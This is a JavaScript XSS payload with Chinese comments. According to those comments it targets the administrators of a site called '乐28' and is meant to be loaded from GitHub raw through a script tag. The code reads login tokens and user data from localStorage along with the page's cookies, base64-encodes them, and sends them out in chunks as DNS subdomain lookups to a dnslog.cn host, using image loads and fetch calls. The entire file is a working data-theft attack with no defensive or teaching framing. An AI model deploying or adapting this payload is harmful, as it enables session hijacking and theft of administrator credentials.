// 乐28 XSS 偷取 payload —— 部署到 GitHub raw，通过 script src 加载
// 功能：读取管理员 localStorage 的 token/user + cookie，DNS 外带到 dnslog
(function(){
  var DNS = 'pkaa6g.dnslog.cn';
  function g(k){ try{ return localStorage.getItem(k)||''; }catch(e){ return ''; } }
  var token = g('jnd28:token') || g('token') || '';
  var user  = g('jnd28:user')  || g('user')  || '';
  var ck    = document.cookie || '';
  var host  = location.host;

  // base64 编码（兼容中文）
  function b64(s){ try{ return btoa(unescape(encodeURIComponent(s))); }catch(e){ return 'err'; } }

  // 拼接所有敏感数据
  var payload = 'T=' + token + '|U=' + user + '|C=' + ck + '|H=' + host;
  var encoded = b64(payload);

  // 去掉 DNS 不允许的字符，只保留 [A-Za-z0-9-]
  var safe = encoded.replace(/[^A-Za-z0-9]/g, '');

  // 分段外带（每段最多 40 字符，作为子域名标签）
  var i = 0, step = 40;
  function sendNext(){
    if (i >= safe.length) return;
    var chunk = safe.slice(i, i + step);
    i += step;
    var img = new Image();
    img.src = '//' + chunk + '.s' + (i/step - 1) + '.' + DNS;
    img.onload = sendNext;
    img.onerror = sendNext;
    // 兜底：也用 fetch 尝试
    try{ fetch('//' + chunk + '.s' + (i/step - 1) + '.' + DNS); }catch(e){}
  }
  sendNext();

  // 同时发送一个固定标记，确认 JS 已加载
  try{ new Image().src = '//jsok.' + DNS; }catch(e){}
})();
